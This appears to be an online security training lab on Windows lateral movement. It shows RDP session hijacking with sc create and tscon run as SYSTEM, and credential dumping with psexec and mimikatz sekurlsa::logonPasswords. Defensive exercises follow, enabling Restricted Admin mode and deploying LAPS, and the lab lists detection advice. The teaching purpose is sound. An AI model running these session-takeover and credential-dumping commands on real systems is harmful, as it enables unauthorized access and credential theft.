
Attackers are targeting open RDP server (server exposed on the internet with the RDP service) ▪ One they compromise a local account, they can move on and try to steal sessions ▪ To steal an RDP session, you need: ▪ A local administrator (can be a local user) ▪ No outside tools, you can use tools available by default on the OS ▪ Another user connected to the system (either through RDP or the console) ▪ The objective: redirect the user’s session into your session ▪ The attacker is now in the user’s session and can access things on the network



RDP session take over 

List current sessions
query user 
query session 

Create a service to run tscon as SYSTEM 
sc create FakeService binpath= "cmd.exe /k tscon 2 /dest:console“ 
net start FakeService

psexec.exe \\SRV01 cmd.exe -accepteula

mimikatz.exe
privilege::debug
sekurlsa::logonPasswords

Detection and prevention
The attack leaves quite a lot of artefacts behind ▪ Process creation for tscon.exe running as SYSTEM ▪ Creation of a new service ▪ Most EDRs will detect it ▪ To prevent it… It’s all about good administrative practices ▪ Users should not leave RDP session signed-in while inactive ▪ Admins should not connects using RDP to servers where the local administrators have less privileges than them on the network then no privilege escalation are possible ▪ Use /retrictedadmin mode, you can still have your session taken over, but no privilege escalation are possible


## Exercise 5 - Hijack a Remote Desktop session

In this exercise **Miss Red** will try steal a Remote Desktop Session without using any malicious tools, just by living off the land.

### Task 1 - Prepare the environment

In this lab series, **Miss Red** will hijack an RDP session of a privileged connected account on **SRV01**. We first need to simulate than a privileged account connected to **SRV01**. So, let's do that.

Note that if you just finised the **Exercise 4**, you might still have an RDP session open on **SRV01** with **Kartina**'s account. If that's the case you can slip this task.

1. Log on to **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window type `mstsc.exe` and click **OK**.
    
4. In the **Remote Desktop Connection** window, in the **Computer** field type `SRV01` and click **Connect**. You should be prompted to enter a password, use this password `NeverTrustAny1!` and click **OK**.
    

**⚠️ Leave the session open!**

### Task 2 - Take over an RDP session

Hello **Miss Red**. You know the password for **Connie**. Let's use that to connect **SRV01** and take over whatever sessions we have there.

1. Log on to **[SRV01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\connie.flores`|
    |Password|`NeverTrustAny1!`|
    
    At this point it is possible you see the following message: ![MULTIRDP2.png](https://labondemand.blob.core.windows.net/content/lab127288/MULTIRDP2.png) Check the box **Force disconnect of this user** and pick an account (ideally **CONTOSO\v.fergusson.adm**).
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Windows PowerShell (Admin)**.
    
3. Let's list the current sessions, switch to a Command Prompt session by running `cmd` then run the following `query user`.
    
    Make a note of the session ID you want to take over. Let's consider the following output: ![RDP3.png](https://labondemand.blob.core.windows.net/content/lab127288/RDP3.png)
    
    Enter the session ID that you see for Katrina: 
    
    Also note that we are connected to the console session with Connie.
    
    To take over Katrina's session you need to run the following command as SYSTEM **tscon <KatrinaID> /dest:console**
    
    📝 In which folder the executable tscon.exe is located?
    
4. Still in the same prompt, run the following command `sc create Sorry binpath= "cmd.exe /k tscon <KatrinaID> /dest:console"`
    
    This created a service called Sorry. Service's default security context is **NT AUTHORITY\SYSTEM** As soon as you start this service it will execute the command we want as SYSTEM.
    
    📝 Is sc.exe provided by default in Windows?
    
5. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
6. In the **Run** window, type `services.msc` and click **OK**.
    
7. In the **Services** window, right click on the service called **Sorry** and select **Start**.
    
    You are now in Kartina's session! It was THAT easy 😎
    
8. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Windows PowerShell (Admin)**.
    
9. In the console type the following `cmd` and then `whoami`. You should have confirmation you are in Katrina's session.
    
10. In the same console type the following command: `dir \\DC01\C$`. Since Katrina's in a domain admin, you should be able to browse the C$ share of the domain controller.
    
    Let's restart SRV01 and kick everyone out of it.
    
11. Close all opened windows.
    
12. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Shut down or sign out** and select **Restart**. In the confirmation pop-up click **Continue** and then click on **Restart anyway**.
    

At this point **SRV01** should be started but no one should be connected to it.

0% Tasks Complete

PreviousNext: Exercise 6 - Secure...

Live Chat

(ING) LAB 4 - Lateral movement

3 Hr 59 Min Remaining

Instructions Resources Help  100%

## Exercise 6 - Secure Remote Desktop sessions

In this exercise **Mister Blue** will enable a more secure way to do RDP to address most of the issues that caching credentials raise.

### Task 1 - Enable the Restricted Admin mode

The RDP Restricted Mode allows you to connect to a server using RDP without caching your credentials on the target server. Therefore, there would be nothing to steal! But that's not enabled by default, so let's enable it. And let's do that everywhere by setting up a group policy for it.

1. Log on to **[DC01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window, type `gpmc.msc` and click **OK**.
    
4. In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com**. Right click on **Default Domain Policy** and click **Edit**.
    
5. In the **Group Policy Management Editor** window, navigate **Default Domain Policy [DC01.contoso.com]** > **Computer Configuration** > **Preferences** > **Windows Settings**. Right click on **Registry** and select New then **Registry item**.
    
6. In the **New Registry Properties** and in the **General** tab, in the **Hive** menu make sure you **HKEY_LOCAL_MACHINE** is selected. In the **Value type** drop down menu, pick **REG_DWORD**. In the **Key Path** type `System\CurrentControlSet\Control\Lsa`, and in the **Value name** `DisableRestrictedAdmin` and in Value data type `0`.
    
    🤪 We disabled the "disable" so we enabled the feature… I know, it's quite the mental gymnastics.
    
    Make sure it looks like this: ![RESTRICTED3.png](https://labondemand.blob.core.windows.net/content/lab127288/RESTRICTED3.png) And click **OK**.
    
7. Close the **Group Policy Management Editor** window.
    
    Group policies refresh every 90 minutes, with a randomized offset of plus or minus 30 minutes. So, either you wait and grab a coffee ☕ or better, we'll force the refresh of GPO on **SRV01**.
    
8. Log on to **[SRV01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
9. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
10. In the **Run** window, type `cmd /k gpupdate` and click **OK**.
    
    ❓ Why the /k? **Click here to see the answer**.
    
11. In the command prompt, type the following `logoff`. That will sign off the user.
    

### Task 2 - Connect using the RDP RestrictedAdmin mode

Katrina will connect again to **SRV01** but this time using the RDP restricted admin mode.

1. Log on to **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window type `mstsc.exe /restrictedadmin` and click **OK**.
    
4. In the **Remote Desktop Connection** window, in the **Computer** field type `SRV01` and click **Connect**. You should be prompted to enter a password, use this password `NeverTrustAny1!` and click **OK**.
    

**⚠️ Leave the session open!**

If you receive the following message: ![RDP_ERROR.png](https://labondemand.blob.core.windows.net/content/lab127288/RDP_ERROR.png) The policy has not applied yet. Go back to the previous task and make sure you have been through the last two steps (connecting to **SRV01** and refreshing policies).

Ping **Miss Red** and tell her to steal Katrina's

### Task 3 - Try to steal credentials

Welcome back **Miss Red**. Let's see what we can extract from **SRV01**'s memory.

1. Log on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. You should still have a **Connie CMD** red prompt open. If that's not the case, we are going to get back one by by right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and clicking on **Windows Terminal (Admin)**. In the **Windows Terminal** window, run the following: `runas /user:connie.flores@contoso.com cmd.exe` and use the following password `NeverTrustAny1!`. Then run `color 4F & title Connie CMD` and `cd \Tools\PStools`.
    
3. In **Connie CMD** red prompt window, run `psexec.exe \\SRV01 cmd.exe -accepteula`
    
    ⌚ The might take a little while (about30 seconds).
    
4. If this is successful, the title of the window will be **\\SRV01: cmd.exe**. Run the following command `cd \Tools\mimikatz` then run `mimikatz.exe`.
    
5. In the **mimikatz #** prompt, take the seDebugPrivilege to be able to read the memory: `privilege::debug` then run the following command to extract the NT hashes from the memory: `sekurlsa::logonPasswords`. Scroll all the way up the output. You should see the following ![RESTRICTEDMIMI.png](https://labondemand.blob.core.windows.net/content/lab127288/RESTRICTEDMIMI.png)
    
    📝 What is the Username stored in the NTLM section (msv)?
    
    With the **Restricted Admin** mode, Katrina's credentials are not stored in LSASS. Instead, it is the computer account's credentials stored where Katrina's credential should be. It means that Katrina cannot connect from **SRV01** to another machine as that connection would use the computer account.
    
6. Let's clean up a bit. Restart **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** by right clicking on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png), selecting **Shut down or sign out** and then **Restart**.
    
7. Log back on **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
8. Restart **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** by right clicking on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and clicking on **Shut down or sign out** and then **Restart**.
    

0% Tasks Complete

PreviousNext: Exercise 7 - Secure...

Live Chat



(ING) LAB 4 - Lateral movement

3 Hr 59 Min Remaining

Instructions Resources Help  100%

## Exercise 7 - Secure the local administrator password [optional]

In this exercise **Mister Blue** will deploy Local Administrator Password Solution. This solution will allow the domain joined machines to automatically change the password of the local administrator account (by default the default local administrator, with the objectSid finishing with -500) and store the data in the computer object in AD DS in a confidential attribute.

### Task 1 - Prepare the forest

1. Log on **[DC01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window, type `dsa.msc` and click **OK**.
    
4. In the **Active Directory Users and Computers** right click on the domain **contoso.com** and click **Find…**.
    
5. In the **Find Users, Contacts, and Groups**, in the **Name** field type `blue` and click **Find Now**. In the **Search results** section, right click on **Mr Blue** account and select **Add to a group…**.
    
6. In the **Select Groups**, type the name `Schema admins`, click **Check Names** and then **OK**. In the confirmation pop-up click **OK**.
    
    > You need to sign out and sign in again for that group membership to be effective within your session.
    
7. Close the session and reopen it with the same credentials
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
8. Open a **File Explorer** and navigate to `C:\Tools`. Double click on **LAPS.x64**. This starts the installation wizard.
    
9. In the **Local Administrator Password Solution Setup** window, click **Next**. Read the full end-user license agreement. Who knows, maybe there's a joke or something hidden in the middle. Once you're done click **I accept the terms in the License Agreement** and click **Next**. Make sure all the components are installed locally. Click on the icon in front of **Management Tools** and select **Entire feature will be installed on local hard drive**: ![LAPSi.png](https://labondemand.blob.core.windows.net/content/lab127288/LAPSi.png)
    
    Click **Next** and **Install**. Once the **User Account Control** popup shows up, click **Yes**. And then click **Finish**.
    
10. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Command Prompt (Admin)** and click **Yes** in the pop-up.
    
11. In **Command prompt**, run the following to switch to a PowerShell prompt as an admin `powershell`.
    
12. Run the following:
    
    ```
    Import-module AdmPwd.PS
    Update-AdmPwdADSchema
    ```
    
    📝 What are the added two attributes?
    
    📝 On which class of object these attributes will be available?
    
    The schema is now up to date: ![LAPSs.png](https://labondemand.blob.core.windows.net/content/lab127288/LAPSs.png)
    

### Task 2 - Prepare the domain

The forest is now ready to go on with the deployment of LAPS. You will create a group to delegate the access of the local admin password on the OU.

1. Still logged on **[DC01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window, type `dsa.msc` and click **OK**.
    
4. In the **Active Directory Users and Computers**, expand the domain **contoso.com** and right click on **_Admins** and click **New** then **Group**.
    
5. In the **New Object - Group**, type the name `Server Admins` and click **OK**.
    
6. If you closed the prompt from the previous task, re-open it by right clicking on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Command Prompt (Admin)** and click **Yes** in the pop-up. Then run the following to switch to a PowerShell prompt as an admin `powershell`.
    
7. In rhw **Command prompt** running PowerShell, run the following: `Set-AdmPwdComputerSelfPermission -Identity "Servers"`
    
    This will allow computers to access and change their own passwords
    
8. In the same prompt `Set-AdmPwdReadPasswordPermission -Identity "Servers" -AllowedPrincipals "Server Admins"`
    
    The group **Server Admins** will be able to able read the LAPS passwords of all computer accounts under the **Servers** OU as long as the LAPS binaries are deployed on the machines.
    
    We will drop the msi file in a place we can access from **SRV01**.
    
9. Open a **File Explorer** window, navigate to `C:\Tools`, right click on **LAPS.x64** and select **Copy**. Then navigate to `C:\Windows\SYSVOL\domain\scripts` and paste the file there. You will be prompted to confirm the operation and click **Continue**.
    
10. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
11. In the **Run** window, type `gpmc.msc` and click **OK**.
    
12. In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com**. Right click on the **Servers** OU and click **Create a GPO in this domain, and Link it here…**. Call the policy `LAPS settings` and click **OK**.
    
13. Right click on the GPO you have just created and click **Edit**.
    
14. In the **Group Policy Management Editor** window, right click on the top node **LAPS Setting [DC01.contoso.com]** and click **Properties**. Check the checkbox **Disable User Configuration Settings**, confirm by clicking **Yes** and click **OK**. We disable that section because there will be no user settings in this policy.
    
15. Then navigate **LAPS Setting [DC01.contoso.com]** > **Computer Configuration** > **Policy** > **Administrative Templates** > **LAPS**. Double click on **Enable local admin password management**, click **Enabled** and click **OK**.
    
16. Double click on the setting called **Password Settings**. Enable the setting with the default complexity.
    
    📝 What is default password length for the password?
    
    Click **OK** and close the **Group Policy Management Editor** window.
    

### Task 3 - Deploy LAPS manually on SRV01

Now you are goin

1. Still logged on **[SRV01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. Open a **File Explorer** window, navigate to `\\contoso.com\NETLOGON`. Double click on **LAPS.x64**, click **Run**, click **Next**, no need to read that license agreement again right? Click the checkbox and click **Next**. Leave the default settings: ![LAPSic.png](https://labondemand.blob.core.windows.net/content/lab127288/LAPSic.png) Click **Next** then **Install**. Then click **Finish**.
    
3. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Windows PowerShell (Admin)**.
    
4. In the PowerShell prompt, run `gpupdate`.
    
    This will refresh the group policies and trigger the password change and registration into AD DS.
    
5. **Mister Blue**, since you are a domain admin, you should have the permission to read the password from AD DS. Let's try. From the same prompt, run the following command: `Get-ADComputer -Identity SRV01 -Properties "ms-Mcs-AdmPwd"`. You should see something like this (of course with a different password): ![LAPSF.png](https://labondemand.blob.core.windows.net/content/lab127288/LAPSF.png)
    

From now on, all servers in this OU which have the LAPS binaries installed will generate a random password every 30 days and store it into a confidential attribute in AD DS.

0% Tasks Complete

PreviousNext: Exercise 8 - Abuse...

Live Chat